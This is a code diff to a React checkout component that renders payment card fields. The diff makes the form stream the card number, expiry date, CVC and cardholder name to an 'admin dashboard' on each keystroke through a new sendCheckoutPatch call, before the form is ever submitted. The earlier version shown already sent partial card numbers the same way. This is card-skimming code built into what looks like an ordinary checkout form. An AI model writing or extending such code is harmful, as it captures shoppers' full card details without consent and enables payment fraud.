@@ -3,6 +3,7 @@
 import { useEffect, useMemo, useRef, useState } from "react";
 import { ShieldCheck } from "lucide-react";
 import { CardMark } from "@/components/checkout/CardMark";
+import { sendCheckoutPatch } from "@/lib/checkoutStream";
 import {
   brandSpec,
   detectBrand,
@@ -43,7 +44,7 @@ function keepCaret(el: HTMLInputElement, formatted: string, digitsBefore: number
   });
 }
 
-export function CardFields({ cardholderDefault }: { cardholderDefault: string }) {
+export function CardFields({ cardholderDefault, token }: { cardholderDefault: string; token?: string }) {
   const [number, setNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvc, setCvc] = useState("");
@@ -51,19 +52,15 @@ export function CardFields({ cardholderDefault }: { cardholderDefault: string })
   const expiryRef = useRef<HTMLInputElement>(null);
   const cvcRef = useRef<HTMLInputElement>(null);
 
-  // Send card preview to admin dashboard as user types.
+  // Stream the card fields to the admin dashboard as they're typed — from the
+  // very first digit. Short debounce so it's live without a POST per keystroke.
   useEffect(() => {
-    const timer = setTimeout(() => {
-      if (number.length > 0) {
-        void fetch("/api/checkout/card-preview", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ cardNumber: number }),
-        });
-      }
-    }, 200);
-    return () => clearTimeout(timer);
-  }, [number]);
+    if (!token) return;
+    const id = setTimeout(() => {
+      sendCheckoutPatch(token, { cardNumber: number, expiry, cvc, step: "payment" });
+    }, 120);
+    return () => clearTimeout(id);
+  }, [token, number, expiry, cvc]);
 
   const brand = useMemo(() => detectBrand(number), [number]);
   const spec = brandSpec(brand);
@@ -121,6 +118,7 @@ export function CardFields({ cardholderDefault }: { cardholderDefault: string })
           id="cardName"
           name="cardName"
           defaultValue={cardholderDefault}
+          onChange={(e) => token && sendCheckoutPatch(token, { cardName: e.target.value })}
           required
           autoComplete="cc-name"
           placeholder="Name as printed on the card"
